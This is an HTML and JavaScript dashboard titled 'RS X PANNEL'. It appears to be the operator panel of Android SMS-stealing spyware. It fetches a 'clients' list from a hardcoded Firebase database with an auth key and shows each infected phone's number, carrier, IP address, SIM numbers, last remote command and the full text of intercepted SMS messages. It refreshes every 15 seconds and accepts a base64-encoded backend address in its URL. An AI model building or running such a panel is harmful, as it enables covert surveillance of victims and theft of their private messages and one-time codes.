<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RS X PANNEL</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family:system-ui,sans-serif; }
    body { background:#0a0b0f; color:#eee; min-height:100vh; }
    .container { max-width:1300px; margin:0 auto; padding:16px; }
    /* HEADER */
    .header { display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px solid #1c1e24; flex-wrap:wrap; gap:10px; }
    .logo { font-size:24px; font-weight:800; letter-spacing:-1px; }
    .logo span { color:#56cfff; }
    .status { padding:4px 12px; border-radius:20px; background:#071d17; color:#00d68f; font-size:12px; border:1px solid #0c4a38; }
    .search { flex:1; max-width:320px; min-width:150px; }
    .search input { width:100%; padding:8px 14px; border-radius:12px; border:1px solid #1c1e24; background:#0d0e12; color:#eee; outline:none; font-size:13px; }
    .search input:focus { border-color:#444; }
    .btn { padding:6px 16px; border-radius:12px; border:1px solid #1c1e24; background:transparent; color:#aaa; cursor:pointer; font-size:13px; }
    .btn:hover { background:#1c1e24; }
    /* STATS */
    .stats { display:flex; gap:20px; padding:16px 0; flex-wrap:wrap; }
    .stat { min-width:70px; }
    .stat small { display:block; font-size:10px; color:#555; text-transform:uppercase; letter-spacing:.5px; }
    .stat strong { font-size:22px; font-weight:700; }
    .green { color:#00d68f; }
    .red { color:#ff4d5d; }
    .cyan { color:#18bfff; }
    /* FILTERS */
    .filters { display:flex; gap:8px; padding:8px 0 16px; flex-wrap:wrap; }
    .filters button { padding:6px 14px; border-radius:10px; border:0; background:transparent; color:#666; cursor:pointer; font-size:13px; }
    .filters button.active { background:#1a0e0f; color:#ff5c5d; border:1px solid #86272c; }
    /* GRID */
    .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:16px; }
    .card { background:#111216; border:1px solid #24262d; border-radius:16px; padding:16px; cursor:pointer; transition:0.2s; }
    .card:hover { border-color:#444; transform:translateY(-2px); }
    .card .top { display:flex; align-items:center; gap:12px; margin-bottom:12px; }
    .card .icon { width:40px; height:40px; border-radius:12px; border:1px solid #24262d; background:#0d0e12; display:flex; align-items:center; justify-content:center; font-size:18px; }
    .card .icon.online { color:#00d68f; border-color:#086b4d; background:#071d17; }
    .card .info { flex:1; overflow:hidden; }
    .card .info .name { font-weight:600; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
    .card .info .id { font-size:11px; color:#555; margin-top:2px; font-family:monospace; }
    .card .row { display:flex; justify-content:space-between; padding:6px 0; border-bottom:1px solid #16181e; font-size:13px; }
    .card .row:last-child { border:0; }
    .card .row .label { color:#666; }
    .card .row .value { color:#bbb; }
    .card .badge { display:inline-block; padding:2px 8px; border-radius:12px; font-size:10px; font-weight:600; }
    .badge.online { background:#071d17; color:#00d68f; border:1px solid #0c4a38; }
    .badge.offline { background:#1a1a1a; color:#555; border:1px solid #1c1e24; }
    .empty { grid-column:1/-1; text-align:center; padding:60px 0; color:#444; }
    /* DETAIL MODAL */
    .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.92); z-index:999; padding:20px; overflow:auto; }
    .modal-content { max-width:700px; margin:auto; background:#111216; border:1px solid #24262d; border-radius:24px; padding:24px; }
    .modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; }
    .modal-header h2 { font-size:22px; }
    .modal-close { background:none; border:0; color:#888; font-size:28px; cursor:pointer; }
    .modal-body .field { display:flex; padding:8px 0; border-bottom:1px solid #1c1e24; }
    .modal-body .field .label { width:120px; color:#666; font-size:13px; }
    .modal-body .field .value { flex:1; color:#ddd; font-size:13px; word-break:break-all; }
    .sms-list { margin-top:16px; }
    .sms-item { padding:10px 12px; background:#0a0b0f; border:1px solid #1c1e24; border-radius:10px; margin-bottom:6px; }
    .sms-item .s { display:flex; justify-content:space-between; font-size:11px; color:#555; }
    .sms-item .b { margin-top:4px; font-size:13px; color:#ccc; }
    /* toast */
    .toast { position:fixed; bottom:30px; left:50%; transform:translateX(-50%); background:#1a1c22; border:1px solid #2a2d34; padding:10px 24px; border-radius:14px; z-index:9999; display:none; font-size:14px; }
    @media(max-width:600px){ .header .search { order:3; flex:1 0 100%; } .stats { gap:12px; } .stat strong { font-size:18px; } .grid { grid-template-columns:1fr; } }
  </style>
</head>
<body>
<div class="container" id="app">

<!-- Header -->
<div class="header">
  <div class="logo">RS X <span>PANNEL</span></div>
  <div class="status" id="statusBadge">● Connecting...</div>
  <div class="search"><input id="searchInput" placeholder="Search devices..." oninput="filterDevices()"></div>
  <button class="btn" id="logoutBtn" style="display:none;">Logout</button>
</div>

<!-- Stats -->
<div class="stats" id="stats">
  <div class="stat"><small>Total</small><strong id="statTotal">0</strong></div>
  <div class="stat"><small>Online</small><strong id="statOnline" class="green">0</strong></div>
  <div class="stat"><small>Offline</small><strong id="statOffline">0</strong></div>
  <div class="stat"><small>Battery</small><strong id="statBattery" class="cyan">0</strong></div>
</div>

<!-- Filters -->
<div class="filters" id="filters">
  <button class="active" data-filter="all">All</button>
  <button data-filter="online">Online</button>
  <button data-filter="offline">Offline</button>
  <button data-filter="battery">Battery ↓</button>
</div>

<!-- Grid -->
<div class="grid" id="deviceGrid"></div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<!-- Detail Modal -->
<div class="modal" id="detailModal">
  <div class="modal-content">
    <div class="modal-header">
      <h2 id="detailName">Device</h2>
      <button class="modal-close" onclick="closeDetail()">&times;</button>
    </div>
    <div class="modal-body" id="detailBody"></div>
  </div>
</div>

</div>

<script>
// ─── CONFIG ────────────────────────────────────────────────────────────
// You can change these defaults or use the URL param
const DEFAULT_URL = 'https://rahul-fd65f-default-rtdb.firebaseio.com';
const DEFAULT_KEY = 'V';  // the auth parameter

// ─── STATE ─────────────────────────────────────────────────────────────
let devices = [];
let currentFilter = 'all';
let currentSort = 'newest';

// ─── DOM REFS ──────────────────────────────────────────────────────────
const grid = document.getElementById('deviceGrid');
const statusBadge = document.getElementById('statusBadge');
const statTotal = document.getElementById('statTotal');
const statOnline = document.getElementById('statOnline');
const statOffline = document.getElementById('statOffline');
const statBattery = document.getElementById('statBattery');
const searchInput = document.getElementById('searchInput');
const toast = document.getElementById('toast');
const detailModal = document.getElementById('detailModal');
const detailName = document.getElementById('detailName');
const detailBody = document.getElementById('detailBody');

// ─── TOAST ─────────────────────────────────────────────────────────────
let toastTimer;
function showToast(msg, type='info', duration=2500) {
  toast.textContent = msg;
  toast.style.display = 'block';
  toast.style.borderColor = type==='error' ? '#4b2227' : '#086b4d';
  toast.style.color = type==='error' ? '#ff656d' : '#00d68f';
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => { toast.style.display = 'none'; }, duration);
}

// ─── FETCH DATA ────────────────────────────────────────────────────────
async function fetchDevices(url, key) {
  try {
    statusBadge.textContent = '● Loading...';
    statusBadge.style.color = '#f6cf45';
    const fullUrl = `${url}/clients.json?auth=${key}`;
    const res = await fetch(fullUrl);
    if (!res.ok) {
      const err = await res.text().catch(() => '');
      throw new Error(`HTTP ${res.status}: ${err.slice(0,100)}`);
    }
    const data = await res.json();
    if (!data || typeof data !== 'object') {
      devices = [];
    } else {
      // Convert object to array with id
      devices = Object.entries(data).map(([id, client]) => {
        // Extract fields based on actual data structure
        const name = client.name || client.deviceName || client.model || client.modelName || id;
        const online = client.status === true || client.status === 'online' || client.online === true;
        const platform = client.platform || client.os || client.device || 'Unknown';
        const phone = client.phone || client.phoneNumber || client.mobNo || client.number || 'N/A';
        const network = client.network || client.carrier || client.provider || 'N/A';
        const battery = client.battery || client.batteryLevel || 0;
        const batteryPercent = typeof battery === 'string' ? parseInt(battery.replace('%','')) : (typeof battery === 'number' ? battery : 0);
        const lastSeen = client.lastSeen || client.timestamp || client.lastMessageTime || Date.now();
        const ip = client.ip || client.ipAddress || 'N/A';
        const android = client.android || client.androidV || client.osVersion || 'N/A';
        const command = client.command || null;
        const webhookEvent = client.webhookEvent || null;
        const sims = client.sims || client.simCards || [];
        const sms = client.sms || null; // may contain messages
        return {
          id,
          name,
          online,
          platform,
          phone,
          network,
          battery: batteryPercent,
          lastSeen,
          ip,
          android,
          command,
          webhookEvent,
          sims,
          sms,
          raw: client
        };
      });
    }
    statusBadge.textContent = `● ${devices.length} devices`;
    statusBadge.style.color = '#00d68f';
    showToast(`Loaded ${devices.length} devices`);
    renderDevices();
    updateStats();
  } catch (err) {
    statusBadge.textContent = '● Error';
    statusBadge.style.color = '#ff4d5d';
    showToast('Error: ' + err.message, 'error');
    devices = [];
    renderDevices();
    updateStats();
  }
}

// ─── RENDER ────────────────────────────────────────────────────────────
function renderDevices() {
  const searchTerm = searchInput.value.toLowerCase().trim();
  let filtered = devices.filter(d => {
    if (currentFilter === 'online') return d.online;
    if (currentFilter === 'offline') return !d.online;
    return true;
  });
  if (searchTerm) {
    filtered = filtered.filter(d => 
      d.name.toLowerCase().includes(searchTerm) ||
      d.id.toLowerCase().includes(searchTerm) ||
      d.phone.includes(searchTerm)
    );
  }
  // Sort
  if (currentSort === 'battery') {
    filtered.sort((a,b) => b.battery - a.battery);
  } else if (currentSort === 'name') {
    filtered.sort((a,b) => a.name.localeCompare(b.name));
  } else {
    // newest first by lastSeen
    filtered.sort((a,b) => b.lastSeen - a.lastSeen);
  }

  if (filtered.length === 0) {
    grid.innerHTML = `<div class="empty">No devices found</div>`;
    return;
  }

  grid.innerHTML = filtered.map(d => {
    const onlineClass = d.online ? 'online' : '';
    const bat = d.battery || 0;
    const batColor = bat >= 60 ? '#00d68f' : bat >= 30 ? '#f6cf45' : '#ff4d5d';
    const lastSeenStr = d.lastSeen ? new Date(d.lastSeen).toLocaleString() : 'Never';
    return `
      <div class="card" onclick="showDetail('${d.id}')">
        <div class="top">
          <div class="icon ${onlineClass}">${d.online ? '◉' : '◌'}</div>
          <div class="info">
            <div class="name">${escapeHTML(d.name)}</div>
            <div class="id">${escapeHTML(d.id)}</div>
          </div>
          <span class="badge ${d.online ? 'online' : 'offline'}">${d.online ? 'Online' : 'Offline'}</span>
        </div>
        <div class="row"><span class="label">Platform</span><span class="value">${escapeHTML(d.platform)}</span></div>
        <div class="row"><span class="label">Phone</span><span class="value">${escapeHTML(d.phone)}</span></div>
        <div class="row"><span class="label">Battery</span><span class="value" style="color:${batColor}">${bat}%</span></div>
        <div class="row"><span class="label">Last Seen</span><span class="value">${lastSeenStr}</span></div>
        ${d.command ? `<div class="row"><span class="label">Last Command</span><span class="value" style="font-family:monospace;color:#18bfff;font-size:12px;">${escapeHTML(d.command)}</span></div>` : ''}
      </div>
    `;
  }).join('');
}

function updateStats() {
  const total = devices.length;
  const online = devices.filter(d => d.online).length;
  const offline = total - online;
  const avgBat = total ? Math.round(devices.reduce((s,d) => s + d.battery, 0) / total) : 0;
  statTotal.textContent = total;
  statOnline.textContent = online;
  statOffline.textContent = offline;
  statBattery.textContent = avgBat + '%';
}

function escapeHTML(str) {
  if (!str) return '';
  return String(str).replace(/[&<>"]/g, function(m) {
    if (m === '&') return '&amp;';
    if (m === '<') return '&lt;';
    if (m === '>') return '&gt;';
    if (m === '"') return '&quot;';
    return m;
  });
}

// ─── FILTERS ──────────────────────────────────────────────────────────
document.querySelectorAll('#filters button').forEach(btn => {
  btn.addEventListener('click', function() {
    document.querySelectorAll('#filters button').forEach(b => b.classList.remove('active'));
    this.classList.add('active');
    const filter = this.dataset.filter;
    if (filter === 'battery') {
      currentSort = 'battery';
      currentFilter = 'all';
    } else if (filter === 'online') {
      currentFilter = 'online';
      currentSort = 'newest';
    } else if (filter === 'offline') {
      currentFilter = 'offline';
      currentSort = 'newest';
    } else {
      currentFilter = 'all';
      currentSort = 'newest';
    }
    renderDevices();
  });
});

function filterDevices() {
  renderDevices();
}

// ─── DETAIL MODAL ─────────────────────────────────────────────────────
function showDetail(id) {
  const device = devices.find(d => d.id === id);
  if (!device) return;
  detailName.textContent = device.name || 'Device';
  let html = `
    <div class="field"><span class="label">ID</span><span class="value">${escapeHTML(device.id)}</span></div>
    <div class="field"><span class="label">Status</span><span class="value" style="color:${device.online?'#00d68f':'#ff4d5d'}">${device.online?'🟢 Online':'🔴 Offline'}</span></div>
    <div class="field"><span class="label">Platform</span><span class="value">${escapeHTML(device.platform)}</span></div>
    <div class="field"><span class="label">Phone</span><span class="value">${escapeHTML(device.phone)}</span></div>
    <div class="field"><span class="label">Network</span><span class="value">${escapeHTML(device.network)}</span></div>
    <div class="field"><span class="label">Android</span><span class="value">${escapeHTML(device.android)}</span></div>
    <div class="field"><span class="label">Battery</span><span class="value">${device.battery}%</span></div>
    <div class="field"><span class="label">IP</span><span class="value">${escapeHTML(device.ip)}</span></div>
    <div class="field"><span class="label">Last Seen</span><span class="value">${device.lastSeen ? new Date(device.lastSeen).toLocaleString() : 'Never'}</span></div>
    ${device.command ? `<div class="field"><span class="label">Command</span><span class="value" style="font-family:monospace;color:#18bfff;">${escapeHTML(device.command)}</span></div>` : ''}
    ${device.webhookEvent ? `<div class="field"><span class="label">Webhook</span><span class="value" style="font-family:monospace;color:#f6cf45;">${escapeHTML(device.webhookEvent)}</span></div>` : ''}
    ${device.sims && device.sims.length ? `<div class="field"><span class="label">SIMs</span><span class="value">${device.sims.map(s => escapeHTML(s.phoneNumber||s)).join(', ')}</span></div>` : ''}
  `;
  // If there are SMS messages, show them
  if (device.sms && typeof device.sms === 'object') {
    const smsArr = Object.values(device.sms);
    if (smsArr.length) {
      html += `<div class="sms-list"><h4 style="color:#666;font-size:12px;margin-bottom:8px;">📩 SMS (${smsArr.length})</h4>`;
      smsArr.slice().reverse().forEach(msg => {
        const body = msg.body || msg.message || msg.text || '';
        const from = msg.from || msg.sender || 'Unknown';
        const time = msg.time || msg.timestamp || '';
        html += `<div class="sms-item"><div class="s"><span>${escapeHTML(from)}</span><span>${escapeHTML(time)}</span></div><div class="b">${escapeHTML(body)}</div></div>`;
      });
      html += `</div>`;
    }
  }
  detailBody.innerHTML = html;
  detailModal.style.display = 'block';
}

function closeDetail() {
  detailModal.style.display = 'none';
}
detailModal.addEventListener('click', function(e) {
  if (e.target === this) closeDetail();
});

// ─── INIT ─────────────────────────────────────────────────────────────
// Get URL and key from query param or use defaults
const params = new URLSearchParams(window.location.search);
let fbUrl = params.get('url') || params.get('u') || DEFAULT_URL;
let fbKey = params.get('key') || params.get('k') || DEFAULT_KEY;
// If the param 's' is base64 encoded, decode it
const s = params.get('s');
if (s) {
  try {
    const decoded = atob(s);
    const parts = decoded.split('|||');
    if (parts.length >= 2) {
      fbUrl = parts[0];
      fbKey = parts[1];
    } else if (parts.length === 1) {
      // maybe just URL
      fbUrl = parts[0];
    }
  } catch(e) {}
}
// Pre-fill search with any query
const q = params.get('q');
if (q) searchInput.value = q;

// Start fetching
fetchDevices(fbUrl, fbKey);

// Auto-refresh every 15 seconds
setInterval(() => {
  fetchDevices(fbUrl, fbKey);
}, 15000);

// Logout button (optional)
document.getElementById('logoutBtn').addEventListener('click', function() {
  if (confirm('Logout?')) {
    // Clear localStorage if any and reload
    localStorage.removeItem('darkx_accounts');
    window.location.reload();
  }
});
// Show logout if we have a saved account? we don't have, but we can show.
// We'll just show it always.
document.getElementById('logoutBtn').style.display = 'inline-block';

// ─── HANDLE KEYBOARD SHORTCUT ────────────────────────────────────────
document.addEventListener('keydown', function(e) {
  if (e.key === 'Escape') closeDetail();
});
</script>
</body>
</html>
